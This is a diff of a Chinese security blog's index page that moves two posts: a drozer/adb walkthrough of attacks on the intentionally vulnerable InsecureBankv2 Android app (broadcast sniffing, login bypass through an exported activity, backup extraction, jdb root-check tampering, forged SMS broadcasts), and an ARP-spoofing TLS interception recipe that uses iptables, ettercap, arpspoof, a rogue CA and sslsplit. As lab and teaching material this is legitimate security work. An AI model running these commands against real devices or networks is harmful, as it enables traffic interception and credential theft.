@@ -655,6 +655,242 @@
 
 
   
+    <article id="post-移动安全/drozer测试InsecureBankv2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/12/16/移动安全/drozer测试InsecureBankv2/">drozer测试InsecureBankv2</a>
+    </h1>
+  
+
+        <a href="/2016/12/16/移动安全/drozer测试InsecureBankv2/" class="archive-article-date">
+  	<time datetime="2016-12-16T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-12-16</time>
+</a>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>测试app包名：com.android.insecurebankv2</p>
+<h3 id="intent-sniffer-数据嗅探"><a href="#intent-sniffer-数据嗅探" class="headerlink" title="intent sniffer(数据嗅探)"></a>intent sniffer(数据嗅探)</h3><ul>
+<li>利用app.broadcast.sniff 模块    </li>
+</ul>
+<p>首先apktool获取manifest文件，查看receiver组件，获取触发该组件的intent-filter的action name</p>
+<p>利用run app.broadcast.sniff –action theBroadcast 进行嗅探  </p>
+<p>结果获取到修改的密码信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Broadcast receiver registered to sniff matching intents</div><div class="line">[*] Output is updated once a second. Press Control+C to exit.</div><div class="line">Action: theBroadcast</div><div class="line">Raw: Intent &#123; act=theBroadcast flg=0x10 (has extras) &#125;</div><div class="line">Extra: newpass=Dinesh@123! (java.lang.String)</div><div class="line">Extra: phonenumber=15555215554 (java.lang.String)</div></pre></td></tr></table></figure></p>
+<ul>
+<li>代码层次：</li>
+</ul>
+<p>获取到代码，查看注册recever的名称，这个是接受信息；可搜索sendBroadcast来查找谁发的广播</p>
+<h3 id="登入绕过"><a href="#登入绕过" class="headerlink" title="登入绕过"></a>登入绕过</h3><ul>
+<li><p>可查看manifast文件查找exported=“true”的activity名称</p>
+</li>
+<li><p>可以直接使用drozer activity模块查找暴露出的activity</p>
+</li>
+</ul>
+<p>测试：直接调用com.android.insecurebankv2.PostLogin 绕过登入，直接进入转帐等页面</p>
+<h3 id="备份安全测试"><a href="#备份安全测试" class="headerlink" title="备份安全测试"></a>备份安全测试</h3><ul>
+<li><p>可查看manifast文件查看是否允许备份allowBackup=”true”</p>
+</li>
+<li><p>可利用drozer模块：run app.package.backup -f insecurebankv2查看  </p>
+</li>
+</ul>
+<p>测试：  </p>
+<p>在当前目录下备份，在当前目录下会产生backup.ab 文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">adb backup -apk-shared com.android.insecurebankv2</div></pre></td></tr></table></figure>
+<ul>
+<li>读取该文件，后面可以看到登入账户的所有信息</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat backup.ab | (dd bs=24 count=0 skip=1; cat) | zlib-flate -uncompress &gt; backup_compressed.tar (ab的解压未成功)</div></pre></td></tr></table></figure>
+<h3 id="jdb调试app程序"><a href="#jdb调试app程序" class="headerlink" title="jdb调试app程序"></a>jdb调试app程序</h3><ul>
+<li><p>使用adb jdwp来查看那些app是可以被调试的，再次运行insecurebankv2，运行adb jdwp来查看最新增加的ID，记录（注：也可以直接使用ddms来查看可以被调试的app的pid）</p>
+</li>
+<li><p>使用adb forward tcp:1111 jdwp: pid 将调试端口转发到本地主机端口上</p>
+</li>
+<li><p>使用jdb -attach localhost:1111 链接调试端口，进行调试   </p>
+</li>
+</ul>
+<p>测试：  </p>
+<p>实验中主要是更改变量属性值，app会检查设备的root情况并且输出出来  </p>
+<p>本来为rooted，直接更改为 not rooted  </p>
+<p>可能用到的命令：  </p>
+<blockquote>
+<p>class：查看所有用到的包名<br>methods：进入到相应的函数中，这里是：methods com.android.insecurebankv2.PostLogin<br>直接在showRootStatus()方法上下断点，jdb主要命令<br>step – 执行当前行<br>step up – 执行到当前方法返回到其调用程序<br>stepi – 执行当前指令<br>next – 跳过一行（跨过调用）<br>cont – 从断点处继续执行  </p>
+</blockquote>
+<p>运行过程中，观察locals的本地变量  </p>
+<p>出现变量：isrooted=true，利用set isrooted=false进行变量设置  </p>
+<p>run运行，发现提示变为未root  </p>
+<h3 id="hack-广播接受者-恶意发送短信"><a href="#hack-广播接受者-恶意发送短信" class="headerlink" title="hack 广播接受者,恶意发送短信"></a>hack 广播接受者,恶意发送短信</h3><ul>
+<li>run app.broadcast.info 查看是否有暴露出的receiver，查看manifest文件，观察启动该接受者的action</li>
+</ul>
+<p>在反编译代码中查找该reveicer</p>
+<p>本例中代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">public void onReceive(Context paramContext, Intent paramIntent)</div><div class="line">&#123;</div><div class="line">Object localObject = paramIntent.getStringExtra(&quot;phonenumber&quot;);</div><div class="line">paramIntent = paramIntent.getStringExtra(&quot;newpass&quot;);</div><div class="line">并且在下面调用了 ((SmsManager)localObject).sendTextMessage(paramContext, null, paramIntent, null, null);发送短信</div></pre></td></tr></table></figure>
+<p>触发这个的reveicer的代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">private void broadcastChangepasswordSMS(String paramString1, String paramString2)</div><div class="line">&#123;</div><div class="line">if (TextUtils.isEmpty(paramString1.toString().trim()))</div><div class="line">&#123;</div><div class="line">System.out.println(&quot;Phone number Invalid.&quot;);</div><div class="line">return;</div><div class="line">&#125;</div><div class="line">Intent localIntent = new Intent();</div><div class="line">localIntent.setAction(&quot;theBroadcast&quot;);</div><div class="line">localIntent.putExtra(&quot;phonenumber&quot;, paramString1);</div><div class="line">localIntent.putExtra(&quot;newpass&quot;, paramString2);</div><div class="line">sendBroadcast(localIntent);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<ul>
+<li>直接调用am命令：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">adb shell am broadcast -a theBroadcast -n com.android.insecurebankv2/com.android.insecurebankv2.MyBroadCastReceiver --es phonenumber 15210601846 --es newpass Dinesh@123$ 可以直接启动一个广播</div></pre></td></tr></table></figure>
+<ul>
+<li>可以使用drozer 启动：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">run app.broadcast.send --action theBroadcast --component com.android.insecurebankv2 com.android.insecurebankv2.MyBroadCastReceiver --extra string phonenumber 15210601846 --extra string newpass ddddsadsad</div></pre></td></tr></table></figure>
+<h3 id="hack-数据库，provider"><a href="#hack-数据库，provider" class="headerlink" title="hack 数据库，provider"></a>hack 数据库，provider</h3><ul>
+<li><p>drozer里面的命令<code>run scanner.provider.finduris -a com.android.insecurebankv2</code><br>扫描可以利用的provider</p>
+</li>
+<li><p>利用 <code>run app.provider.query</code> 进行查询  </p>
+</li>
+<li><p>在代码中主要是在manifest中查找可以用的provider，再在代码中查看provider的url链接</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">adb shell content query --uri content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers 查看</div></pre></td></tr></table></figure>
+<h3 id="攻击复制的数据"><a href="#攻击复制的数据" class="headerlink" title="攻击复制的数据"></a>攻击复制的数据</h3><p><code>adb shell su u0_a51 service call clipboard 2 s16 包名</code></p>
+<h3 id="攻击数据库"><a href="#攻击数据库" class="headerlink" title="攻击数据库"></a>攻击数据库</h3><p>若是数据库没有加密的话，直接pull下来，查看即可</p>
+<h3 id="不安全的log"><a href="#不安全的log" class="headerlink" title="不安全的log"></a>不安全的log</h3><p>直接ddms或者adb logcat读取敏感数据</p>
+<h3 id="导出内存数据（未测试）"><a href="#导出内存数据（未测试）" class="headerlink" title="导出内存数据（未测试）"></a>导出内存数据（未测试）</h3><p>ddms导出hprof ，利用platform-tools 工具：./hprof-conv com.android.insecurebankv2.hprof  SSSSS.hprof格式化，利用app的内存分析工具分析内存。</p>
+<h3 id="加密解密"><a href="#加密解密" class="headerlink" title="加密解密"></a>加密解密</h3><p>在sharepreferen中可以看到用户名和密码信息，不过都是采用了加密的处理,但是在代码中可以看到采用了硬加密的处理方式,并且有明文的iv和密钥信息，采用的AES的cbc模式加密处理</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/移动安全/">移动安全</a></li></ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2016/12/16/移动安全/drozer测试InsecureBankv2/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+    <article id="post-安全测试/中间人攻击获取ssl-tsl数据" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/12/16/安全测试/中间人攻击获取ssl-tsl数据/">中间人攻击获取ssl数据</a>
+    </h1>
+  
+
+        <a href="/2016/12/16/安全测试/中间人攻击获取ssl-tsl数据/" class="archive-article-date">
+  	<time datetime="2016-12-16T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-12-16</time>
+</a>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="数据流量重定向"><a href="#数据流量重定向" class="headerlink" title="数据流量重定向"></a>数据流量重定向</h2><ul>
+<li>使用ARP欺骗。发送假的网关(gateway)的MAC地址（其实是攻击者的MAC地址) 给受害者, 让受害者误以为 攻击者就是网关。你不需要物理访问受害者的设备就能做到。</li>
+<li>手动改变 受害者的 默认网关。如果你能物理访问受害者设备，这是最简单的方法</li>
+<li>DNS欺骗。 对特定的域名，返回攻击者的IP作为目标服务器的地址 给受害者。</li>
+<li>修改受害者机器的/etc/hosts的条目来 转向某些域名的流量</li>
+</ul>
+<h3 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h3><ol>
+<li>环境：</li>
+</ol>
+<ul>
+<li>攻击者ip:192.168.31.200 操作主机</li>
+<li>网关：192.168.31.1 路由器</li>
+<li>受害者：192.168.31.224 手机或电脑</li>
+</ul>
+<ol>
+<li>开启ip转发</li>
+</ol>
+<p><code>echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward</code></p>
+<ol>
+<li>生成CA证书  </li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">openssl genrsa -out ca.key 4096</div><div class="line">openssl req -new -x509 -days 1826 -key ca.key -out ca.crt</div></pre></td></tr></table></figure>
+<ul>
+<li>第1个命令，生成 4096位的RSA私钥（以pem格式保存) ca.key</li>
+<li>第2个命令， 使用这个刚生成的私钥，来生成一个 自签名的 root CA 证书(ca.crt)</li>
+</ul>
+<p>这两个文件在后面都会用到。只有ca.crt这个证书文件，需要安装 到浏览器，或者受害者的机器上。</p>
+<ol>
+<li>端口流量转发</li>
+</ol>
+<p>用iptables进行流量转发，需要把我们需要的端口进行转发</p>
+<blockquote>
+<p>8080用作非SSL的TCP连接，比如 http, smtp, ftp<br>8443 用作SSL的连接，比如SMTP over SSL, HTTPS等</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">sysctl -w net.ipv4.ip_forward=1</div><div class="line">iptables -t nat -F</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443</div></pre></td></tr></table></figure>
+<ol>
+<li>ARP欺骗</li>
+</ol>
+<p><code>ettercap -T -q -M ARP //192.168.31.224/ //192.168.31.1/</code></p>
+<p><code>arpspoof -i eth0 -t 192.168.31.1 192.168.31.224</code></p>
+<ol>
+<li>直接建立热点</li>
+</ol>
+<p>kali下可以直接建立热点，需要打开iptables的nat功能<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE #对eth0进行源nat</div><div class="line">iptables -A FORWARD -i wlan1 -o eth0 -j ACCEPT #把无线网卡流量转发到有线网卡（或者什么能上网的网卡）上面</div><div class="line">iptables -A FORWARD -p tcp --syn -s 10.0.0.0/24 -j TCPMSS --set-mss 1356 #修改最大报文段长度</div></pre></td></tr></table></figure></p>
+<ol>
+<li>使用SSLsplit进行</li>
+</ol>
+<p><code>sslsplit -D -l connect.log -j /opt/sslsplit/test1 -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</code></p>
+<ol>
+<li>使用starttls-mitm进行(<a href="https://github.com/adrain09/starttls-mitm" target="_blank" rel="external">https://github.com/adrain09/starttls-mitm</a>)</li>
+</ol>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/安全测试/">安全测试</a></li></ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2016/12/16/安全测试/中间人攻击获取ssl-tsl数据/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
     <article id="post-web安全/xss向量" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -964,248 +1200,6 @@
 
 
   
-    <article id="post-安全测试/中间人攻击获取ssl-tsl数据" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/12/16/安全测试/中间人攻击获取ssl-tsl数据/">中间人攻击获取ssl数据</a>
-    </h1>
-  
-
-        <a href="/2016/12/16/安全测试/中间人攻击获取ssl-tsl数据/" class="archive-article-date">
-  	<time datetime="2016-12-16T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-12-16</time>
-</a>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="数据流量重定向"><a href="#数据流量重定向" class="headerlink" title="数据流量重定向"></a>数据流量重定向</h2><ul>
-<li>使用ARP欺骗。发送假的网关(gateway)的MAC地址（其实是攻击者的MAC地址) 给受害者, 让受害者误以为 攻击者就是网关。你不需要物理访问受害者的设备就能做到。</li>
-<li>手动改变 受害者的 默认网关。如果你能物理访问受害者设备，这是最简单的方法</li>
-<li>DNS欺骗。 对特定的域名，返回攻击者的IP作为目标服务器的地址 给受害者。</li>
-<li>修改受害者机器的/etc/hosts的条目来 转向某些域名的流量</li>
-</ul>
-<h3 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h3><ol>
-<li>环境：</li>
-</ol>
-<ul>
-<li>攻击者ip:192.168.31.200 操作主机</li>
-<li>网关：192.168.31.1 路由器</li>
-<li>受害者：192.168.31.224 手机或电脑</li>
-</ul>
-<ol>
-<li>开启ip转发</li>
-</ol>
-<p><code>echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward</code></p>
-<ol>
-<li>生成CA证书  </li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">openssl genrsa -out ca.key 4096</div><div class="line">openssl req -new -x509 -days 1826 -key ca.key -out ca.crt</div></pre></td></tr></table></figure>
-<ul>
-<li>第1个命令，生成 4096位的RSA私钥（以pem格式保存) ca.key</li>
-<li>第2个命令， 使用这个刚生成的私钥，来生成一个 自签名的 root CA 证书(ca.crt)</li>
-</ul>
-<p>这两个文件在后面都会用到。只有ca.crt这个证书文件，需要安装 到浏览器，或者受害者的机器上。</p>
-<ol>
-<li>端口流量转发</li>
-</ol>
-<p>用iptables进行流量转发，需要把我们需要的端口进行转发</p>
-<blockquote>
-<p>8080用作非SSL的TCP连接，比如 http, smtp, ftp<br>8443 用作SSL的连接，比如SMTP over SSL, HTTPS等</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">sysctl -w net.ipv4.ip_forward=1</div><div class="line">iptables -t nat -F</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443</div></pre></td></tr></table></figure>
-<ol>
-<li>ARP欺骗</li>
-</ol>
-<p><code>ettercap -T -q -M ARP //192.168.31.224/ //192.168.31.1/</code></p>
-<p><code>arpspoof -i eth0 -t 192.168.31.1 192.168.31.224</code></p>
-<ol>
-<li>直接建立热点</li>
-</ol>
-<p>kali下可以直接建立热点，需要打开iptables的nat功能<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE #对eth0进行源nat</div><div class="line">iptables -A FORWARD -i wlan1 -o eth0 -j ACCEPT #把无线网卡流量转发到有线网卡（或者什么能上网的网卡）上面</div><div class="line">iptables -A FORWARD -p tcp --syn -s 10.0.0.0/24 -j TCPMSS --set-mss 1356 #修改最大报文段长度</div></pre></td></tr></table></figure></p>
-<ol>
-<li>使用SSLsplit进行</li>
-</ol>
-<p><code>sslsplit -D -l connect.log -j /opt/sslsplit/test1 -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</code></p>
-<ol>
-<li>使用starttls-mitm进行(<a href="https://github.com/adrain09/starttls-mitm" target="_blank" rel="external">https://github.com/adrain09/starttls-mitm</a>)</li>
-</ol>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/安全测试/">安全测试</a></li></ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2016/12/16/安全测试/中间人攻击获取ssl-tsl数据/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
-    <article id="post-移动安全/drozer测试InsecureBankv2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/12/16/移动安全/drozer测试InsecureBankv2/">drozer测试InsecureBankv2</a>
-    </h1>
-  
-
-        <a href="/2016/12/16/移动安全/drozer测试InsecureBankv2/" class="archive-article-date">
-  	<time datetime="2016-12-16T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-12-16</time>
-</a>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>测试app包名：com.android.insecurebankv2</p>
-<ol>
-<li>intent sniffer(数据嗅探)  </li>
-</ol>
-<ul>
-<li><p>利用app.broadcast.sniff 模块<br>首先apktool获取manifest文件，查看receiver组件，获取触发该组件的intent-filter的action name<br>利用run app.broadcast.sniff –action theBroadcast 进行嗅探<br>结果获取到修改的密码信息：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Broadcast receiver registered to sniff matching intents</div><div class="line">[*] Output is updated once a second. Press Control+C to exit.</div><div class="line">Action: theBroadcast</div><div class="line">Raw: Intent &#123; act=theBroadcast flg=0x10 (has extras) &#125;</div><div class="line">Extra: newpass=Dinesh@123! (java.lang.String)</div><div class="line">Extra: phonenumber=15555215554 (java.lang.String)</div></pre></td></tr></table></figure>
-</li>
-<li><p>代码层次：获取到代码，查看注册recever的名称，这个是接受信息；可搜索sendBroadcast来查找谁发的广播</p>
-</li>
-</ul>
-<ol>
-<li>登入绕过</li>
-</ol>
-<ul>
-<li>可查看manifast文件查找exported=“true”的activity名称</li>
-<li>可以直接使用drozer activity模块查找暴露出的activity<br>测试：直接调用com.android.insecurebankv2.PostLogin 绕过登入，直接进入转帐等页面</li>
-</ul>
-<ol>
-<li>备份安全测试</li>
-</ol>
-<ul>
-<li>可查看manifast文件查看是否允许备份allowBackup=”true”</li>
-<li><p>可利用drozer模块：run app.package.backup -f insecurebankv2查看<br>测试：<br>在当前目录下备份，在当前目录下会产生backup.ab 文件：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">adb backup -apk-shared com.android.insecurebankv2</div></pre></td></tr></table></figure>
-</li>
-<li><p>读取该文件，后面可以看到登入账户的所有信息</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat backup.ab | (dd bs=24 count=0 skip=1; cat) | zlib-flate -uncompress &gt; backup_compressed.tar (ab的解压未成功)</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<ol>
-<li>jdb调试app程序</li>
-</ol>
-<ul>
-<li>使用adb jdwp来查看那些app是可以被调试的，再次运行insecurebankv2，运行adb jdwp来查看最新增加的ID，记录<br>（注：也可以直接使用ddms来查看可以被调试的app的pid）</li>
-<li>使用adb forward tcp:1111 jdwp: pid 将调试端口转发到本地主机端口上</li>
-<li><p>使用jdb -attach localhost:1111 链接调试端口，进行调试<br>测试：<br>实验中主要是更改变量属性值，app会检查设备的root情况并且输出出来<br>本来为rooted，直接更改为 not rooted<br>可能用到的命令：  </p>
-<blockquote>
-<p>class：查看所有用到的包名<br>methods：进入到相应的函数中，这里是：methods com.android.insecurebankv2.PostLogin<br>直接在showRootStatus()方法上下断点，jdb主要命令<br>step – 执行当前行<br>step up – 执行到当前方法返回到其调用程序<br>stepi – 执行当前指令<br>next – 跳过一行（跨过调用）<br>cont – 从断点处继续执行  </p>
-</blockquote>
-<p>运行过程中，观察locals的本地变量<br>出现变量：isrooted=true，利用set isrooted=false进行变量设置<br>run运行，发现提示变为未root  </p>
-</li>
-</ul>
-<ol>
-<li>hack 广播接受者,恶意发送短信</li>
-</ol>
-<ul>
-<li><p>run app.broadcast.info 查看是否有暴露出的receiver，查看manifest文件，观察启动该接受者的action<br>在反编译代码中查找该reveicer</p>
-<p>本例中代码：</p>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">public void onReceive(Context paramContext, Intent paramIntent)</div><div class="line">&#123;</div><div class="line">Object localObject = paramIntent.getStringExtra(&quot;phonenumber&quot;);</div><div class="line">paramIntent = paramIntent.getStringExtra(&quot;newpass&quot;);</div><div class="line">并且在下面调用了 ((SmsManager)localObject).sendTextMessage(paramContext, null, paramIntent, null, null);发送短信</div></pre></td></tr></table></figure>
-<p>触发这个的reveicer的代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">private void broadcastChangepasswordSMS(String paramString1, String paramString2)</div><div class="line">&#123;</div><div class="line">if (TextUtils.isEmpty(paramString1.toString().trim()))</div><div class="line">&#123;</div><div class="line">System.out.println(&quot;Phone number Invalid.&quot;);</div><div class="line">return;</div><div class="line">&#125;</div><div class="line">Intent localIntent = new Intent();</div><div class="line">localIntent.setAction(&quot;theBroadcast&quot;);</div><div class="line">localIntent.putExtra(&quot;phonenumber&quot;, paramString1);</div><div class="line">localIntent.putExtra(&quot;newpass&quot;, paramString2);</div><div class="line">sendBroadcast(localIntent);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<ul>
-<li><p>直接调用am命令：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">adb shell am broadcast -a theBroadcast -n com.android.insecurebankv2/com.android.insecurebankv2.MyBroadCastReceiver --es phonenumber 15210601846 --es newpass Dinesh@123$ 可以直接启动一个广播</div></pre></td></tr></table></figure>
-</li>
-<li><p>可以使用drozer 启动：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">run app.broadcast.send --action theBroadcast --component com.android.insecurebankv2 com.android.insecurebankv2.MyBroadCastReceiver --extra string phonenumber 15210601846 --extra string newpass ddddsadsad</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<ol>
-<li>hack 数据库，provider</li>
-</ol>
-<ul>
-<li><p>drozer里面的命令<code>run scanner.provider.finduris -a com.android.insecurebankv2</code><br>扫描可以利用的provider</p>
-</li>
-<li><p>利用 <code>run app.provider.query</code> 进行查询  </p>
-</li>
-<li><p>在代码中主要是在manifest中查找可以用的provider，再在代码中查看provider的url链接</p>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">adb shell content query --uri content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers 查看</div></pre></td></tr></table></figure>
-<ol>
-<li><p>攻击复制的数据<br><code>adb shell su u0_a51 service call clipboard 2 s16 包名</code></p>
-</li>
-<li><p>攻击数据库<br>若是数据库没有加密的话，直接pull下来，查看即可</p>
-</li>
-<li><p>不安全的log<br>直接ddms或者adb logcat读取敏感数据</p>
-</li>
-<li><p>导出内存数据（未测试）<br>ddms导出hprof ，利用platform-tools 工具：./hprof-conv com.android.insecurebankv2.hprof  SSSSS.hprof格式化，利用app的内存分析工具分析内存。</p>
-</li>
-<li><p>加密解密<br>在sharepreferen中可以看到用户名和密码信息，不过都是采用了加密的处理,但是在代码中可以看到采用了硬加密的处理方式,并且有明文的iv和密钥信息，采用的AES的cbc模式加密处理</p>
-</li>
-</ol>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/移动安全/">移动安全</a></li></ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2016/12/16/移动安全/drozer测试InsecureBankv2/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
     <article id="post-安全测试/brupsuite/基于burp插件的安全测试" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1348,11 +1342,11 @@
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)">soft</a>
+                <a href="javascript:void(0)">移动安全</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)">web安全</a>
+                <a href="javascript:void(0)">soft</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1360,7 +1354,7 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)">移动安全</a>
+                <a href="javascript:void(0)">web安全</a>
               </li>
             
             <div class="clearfix"></div>
